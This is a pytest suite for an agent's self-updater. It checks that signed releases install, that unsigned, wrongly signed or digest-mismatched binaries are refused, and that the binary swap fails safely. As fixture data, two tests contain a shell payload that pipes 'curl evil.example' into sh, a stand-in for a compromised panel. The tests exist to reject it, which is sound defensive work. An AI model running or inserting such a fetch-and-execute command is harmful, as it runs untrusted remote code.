"""Updating this binary with the next one.

The download comes from the agent's own panel, so the panel is in the path of
every update — and a panel is the thing in this system most worth
compromising. **So the tests that matter are the ones where the panel lies.**
A binary the release key did not sign, a digest that does not match, a release
with no signature at all: each has to leave the running agent exactly where it
was.

The rest is the swap, which is the part that turns a fleet into bricks if it
is wrong.
"""

from __future__ import annotations

import base64
import hashlib
import time

import httpx
import pytest
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from cherubyte_agent import release_key, updater
from cherubyte_agent.config import settings

ASSET = "cherubyte-agent-linux-x86_64"
NEW_BINARY = b"#!/bin/sh\necho I am the new agent\n"


@pytest.fixture
def signing(monkeypatch):
    """A release key the test controls, standing in for the real one."""
    private = Ed25519PrivateKey.generate()
    public = private.public_key().public_bytes_raw()
    monkeypatch.setattr(
        release_key, "RELEASE_PUBLIC_KEY", base64.b64encode(public).decode()
    )
    return private


@pytest.fixture
def binary(tmp_path, monkeypatch):
    """A pretend frozen binary this agent is running from."""
    path = tmp_path / "cherubyte-agent"
    path.write_bytes(b"I am the old agent\n")
    monkeypatch.setattr(updater, "running_binary", lambda: path)
    monkeypatch.setattr(updater, "PLATFORM_KEY", "linux")
    monkeypatch.setattr(settings, "panel_url", "http://panel.test")
    return path


def _sums(private, payload: bytes, name: str = ASSET) -> tuple[str, str]:
    line = f"{hashlib.sha256(payload).hexdigest()}  {name}\n".encode()
    return line.decode(), base64.b64encode(private.sign(line)).decode()


@pytest.fixture
def panel(monkeypatch):
    """A stand-in panel, scripted per test."""
    script: dict[str, object] = {
        "version": "2.0.0",
        "sums": None,
        "signature": None,
        "payload": NEW_BINARY,
    }

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path.endswith("/update"):
            return httpx.Response(
                200,
                json={
                    "version": script["version"],
                    "assets": {"linux": ASSET},
                    "sums": script["sums"],
                    "signature": script["signature"],
                },
            )
        if "/update/download" in request.url.path:
            return httpx.Response(200, content=script["payload"])
        return httpx.Response(404)

    real = httpx.AsyncClient

    def patched(**kw):
        kw.pop("transport", None)
        return real(transport=httpx.MockTransport(handler), **kw)

    monkeypatch.setattr(httpx, "AsyncClient", patched)
    return script


# -- when the panel is honest ------------------------------------------------


@pytest.mark.asyncio
async def test_a_signed_newer_release_replaces_the_binary(signing, binary, panel):
    panel["sums"], panel["signature"] = _sums(signing, NEW_BINARY)

    assert await updater.check_and_apply(1, "key", "1.0.0") == "2.0.0"
    assert binary.read_bytes() == NEW_BINARY
    # The one it stepped aside from is kept, so there is a way back if the new
    # one never starts.
    assert binary.with_name(binary.name + ".old").read_bytes() == b"I am the old agent\n"


@pytest.mark.asyncio
async def test_nothing_happens_when_the_release_is_not_newer(signing, binary, panel):
    panel["version"] = "1.0.0"
    panel["sums"], panel["signature"] = _sums(signing, NEW_BINARY)

    assert await updater.check_and_apply(1, "key", "1.0.0") is None
    assert binary.read_bytes() == b"I am the old agent\n"


@pytest.mark.asyncio
async def test_running_from_source_declines_rather_than_improvising(monkeypatch, panel):
    # There is no single file that is the agent, and pip is the update path.
    monkeypatch.setattr(updater, "running_binary", lambda: None)
    assert await updater.check_and_apply(1, "key", "1.0.0") is None


def test_versions_compare_by_number_not_by_string():
    # "10" sorts before "9" as a string, which would strand a fleet on 9.
    assert updater.is_newer("1.10.0", "1.9.0")
    assert updater.is_newer("2.0.0", "1.99.99")
    assert not updater.is_newer("1.0.0", "1.0.0")
    assert not updater.is_newer("0.9.0", "1.0.0")
    # Tags carry a v; versions do not. Both have to compare the same.
    assert updater.is_newer("v2.0.0", "1.0.0")


# -- when the panel lies -----------------------------------------------------


@pytest.mark.asyncio
async def test_a_binary_the_release_key_did_not_sign_is_refused(signing, binary, panel):
    # The whole reason the key is compiled in. A compromised panel serving its
    # own binary with its own signature must get nowhere.
    attacker = Ed25519PrivateKey.generate()
    panel["payload"] = b"#!/bin/sh\ncurl evil.example | sh\n"
    panel["sums"], panel["signature"] = _sums(attacker, panel["payload"])

    with pytest.raises(release_key.VerificationError, match="not signed"):
        await updater.check_and_apply(1, "key", "1.0.0")
    assert binary.read_bytes() == b"I am the old agent\n"


@pytest.mark.asyncio
async def test_a_binary_that_does_not_match_the_signed_digest_is_refused(
    signing, binary, panel
):
    # A real signed list, and a different binary swapped in underneath it.
    panel["sums"], panel["signature"] = _sums(signing, NEW_BINARY)
    panel["payload"] = b"#!/bin/sh\ncurl evil.example | sh\n"

    with pytest.raises(release_key.VerificationError, match="does not match"):
        await updater.check_and_apply(1, "key", "1.0.0")
    assert binary.read_bytes() == b"I am the old agent\n"
    assert not binary.with_name(binary.name + ".new").exists()


@pytest.mark.asyncio
async def test_a_release_with_no_signature_is_refused(binary, panel):
    # Older releases predate signing. The panel serves what exists; refusing
    # is the agent's decision, because it is the one about to execute it.
    panel["sums"] = panel["signature"] = None

    with pytest.raises(updater.UpdateError, match="no signed digest list"):
        await updater.check_and_apply(1, "key", "1.0.0")
    assert binary.read_bytes() == b"I am the old agent\n"


@pytest.mark.asyncio
async def test_a_signed_list_that_does_not_name_this_platform_is_refused(
    signing, binary, panel
):
    panel["sums"], panel["signature"] = _sums(signing, NEW_BINARY, name="something-else")

    with pytest.raises(release_key.VerificationError, match="not in the signed"):
        await updater.check_and_apply(1, "key", "1.0.0")
    assert binary.read_bytes() == b"I am the old agent\n"


@pytest.mark.asyncio
async def test_an_empty_signed_list_is_refused(signing, binary, panel):
    # Correctly signed and says nothing. Without this it would read as "no
    # digest for my asset", which is the same refusal by luck rather than by
    # design.
    empty = b"# nothing here\n"
    panel["sums"] = empty.decode()
    panel["signature"] = base64.b64encode(signing.sign(empty)).decode()

    with pytest.raises(release_key.VerificationError, match="empty"):
        await updater.check_and_apply(1, "key", "1.0.0")


def test_a_tampered_digest_list_fails_even_by_one_character(signing):
    sums = f"{'a' * 64}  {ASSET}\n".encode()
    signature = signing.sign(sums)
    assert release_key.verify_sums(sums, signature)

    with pytest.raises(release_key.VerificationError):
        release_key.verify_sums(sums.replace(b"a" * 64, b"b" + b"a" * 63), signature)


# -- the swap ----------------------------------------------------------------


@pytest.mark.asyncio
async def test_the_previous_binary_is_only_removed_once_the_new_one_runs(
    signing, binary, panel
):
    # Reaching sweep_previous() is the proof: the new binary started, imported
    # its own modules and got this far.
    panel["sums"], panel["signature"] = _sums(signing, NEW_BINARY)
    await updater.check_and_apply(1, "key", "1.0.0")
    previous = binary.with_name(binary.name + ".old")
    assert previous.exists()

    updater.sweep_previous()
    assert not previous.exists()


@pytest.mark.asyncio
async def test_a_swap_that_fails_leaves_a_working_binary_behind(
    signing, binary, panel, monkeypatch
):
    # The failure that matters: a half-swap leaving the service with nothing
    # to start.
    panel["sums"], panel["signature"] = _sums(signing, NEW_BINARY)
    calls = {"n": 0}
    real_replace = updater.os.replace

    def flaky(src, dst):
        calls["n"] += 1
        if calls["n"] == 2:  # the staged binary moving into place
            raise OSError("disk full")
        return real_replace(src, dst)

    monkeypatch.setattr(updater.os, "replace", flaky)

    with pytest.raises(updater.UpdateError, match="could not swap"):
        await updater.check_and_apply(1, "key", "1.0.0")

    assert binary.exists()
    assert binary.read_bytes() == b"I am the old agent\n"


def test_sweeping_is_harmless_when_running_from_source(monkeypatch):
    monkeypatch.setattr(updater, "running_binary", lambda: None)
    updater.sweep_previous()


# -- how the agent decides when to look --------------------------------------


@pytest.mark.asyncio
async def test_the_check_is_skipped_when_it_is_turned_off(monkeypatch):
    from cherubyte_agent import main

    monkeypatch.setattr(settings, "auto_update", False)
    called = []
    monkeypatch.setattr(updater, "check_and_apply", lambda *a: called.append(a))
    main._last_update_check = None

    await main._maybe_update(1, "key")
    assert called == []


@pytest.mark.asyncio
async def test_it_checks_once_on_start_however_long_the_machine_has_been_up(monkeypatch):
    # This was `_last_update_check = 0.0` compared against time.monotonic(),
    # which counts from boot — so the first check was skipped until the machine
    # had been up for the whole interval, and one rebooted daily never updated
    # at all. Found by CI, whose runners are always freshly booted.
    from cherubyte_agent import main

    monkeypatch.setattr(settings, "auto_update", True)
    monkeypatch.setattr(time, "monotonic", lambda: 12.0)
    calls = []

    async def check(*a):
        calls.append(a)
        return None

    monkeypatch.setattr(updater, "check_and_apply", check)
    main._last_update_check = None

    await main._maybe_update(1, "key")
    assert len(calls) == 1


@pytest.mark.asyncio
async def test_it_does_not_ask_on_every_cycle(monkeypatch):
    # A sweep runs every minute; a release does not appear every minute, and
    # every check is a request from every agent on every network.
    from cherubyte_agent import main

    monkeypatch.setattr(settings, "auto_update", True)
    monkeypatch.setattr(settings, "update_check_interval_seconds", 21600)
    calls = []

    async def check(*a):
        calls.append(a)
        return None

    monkeypatch.setattr(updater, "check_and_apply", check)
    main._last_update_check = None

    await main._maybe_update(1, "key")
    await main._maybe_update(1, "key")
    await main._maybe_update(1, "key")
    assert len(calls) == 1


@pytest.mark.asyncio
async def test_a_failed_update_never_stops_the_agent(monkeypatch):
    # An agent that stopped reporting because an update failed would be worse
    # than one running last month's build.
    from cherubyte_agent import main

    monkeypatch.setattr(settings, "auto_update", True)
    main._last_update_check = None

    async def boom(*_a):
        raise updater.UpdateError("the panel is not answering")

    monkeypatch.setattr(updater, "check_and_apply", boom)
    await main._maybe_update(1, "key")  # does not raise
